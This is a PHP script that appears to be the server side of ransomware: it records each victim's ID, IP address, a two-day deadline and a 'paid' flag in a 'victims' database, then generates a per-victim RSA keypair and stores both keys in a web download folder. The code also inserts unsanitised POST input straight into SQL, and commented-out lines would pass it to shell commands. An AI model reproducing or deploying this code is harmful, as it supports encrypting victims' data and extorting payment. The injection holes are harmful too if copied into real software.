<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

function genKeys($targetID) {
  // Adapted from http://goo.gl/7MqUYh

  $config = array(
    "digest_alg" => "sha512",
    "private_key_bits" => 4096,
    "private_key_type" => OPENSSL_KEYTYPE_RSA,
  );

  // Create the keypair
  $genKey = openssl_pkey_new($config);
  
  // Get private key
  openssl_pkey_export($genKey, $privKey);
  
  // Get public key
  $pubKey = openssl_pkey_get_details($genKey);
  $pubKey = $pubKey["key"];

  //openssl_pkey_export_to_file($privKey, "/var/www/html/downloads/" . $targetID . "_priv.pem");
  $setPrivKey = fopen("/var/www/html/downloads/" . $targetID . "_priv.pem", "w") or die("Unable to open file!");
  fwrite($setPrivKey, $privKey);
  fclose($setPrivKey);
  
  $setPubKey = fopen("/var/www/html/downloads/" . $targetID . "_pub.pem", "w") or die("Unable to open file!");
  fwrite($setPubKey, $pubKey);
  fclose($setPubKey);
}

$getTargetID = $_POST['uniqueID'];
$getTargetIP = $_SERVER['REMOTE_ADDR'];

$expTime = time() + (2 * 24 * 60 * 60);
$currTime = time();

$dateExpTime = new DateTime("@$expTime");
$dateCurrTime = new DateTime("@$currTime");

$expTime = $dateExpTime->format('Y-m-d H:i:s');
$currTime = $dateCurrTime->format('Y-m-d H:i:s');

if (isset($_POST['uniqueID']) && !empty($_POST['uniqueID'])) {
   $sqlStmt = "INSERT INTO target_list (unique_id, target_ip, curr_time, exp_time, time_expired, paid) VALUES (\"$getTargetID\", \"$getTargetIP\", \"$currTime\", \"$expTime\", \"FALSE\", \"FALSE\")";

   if ($conn->query($sqlStmt) === TRUE) {
       //echo "Target Acquired";
       //exec("openssl genrsa -out /tmp/$getTargetID.priv.pem 4096");
       //exec("openssl rsa -pubout -in /tmp/$getTargetID.priv.pem -out /var/www/html/downloads/$getTargetID.pub.pem");
       //exec("cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > /var/www/html/downloads/$getTargetID.key.bin");
       genKeys($getTargetID); 
   } else {
       echo "Error: " . $sqlStmt . "<br>" . $conn->error;
   }
} else {
   echo "Please supply the unique_id!";
}

$conn->close();

?>
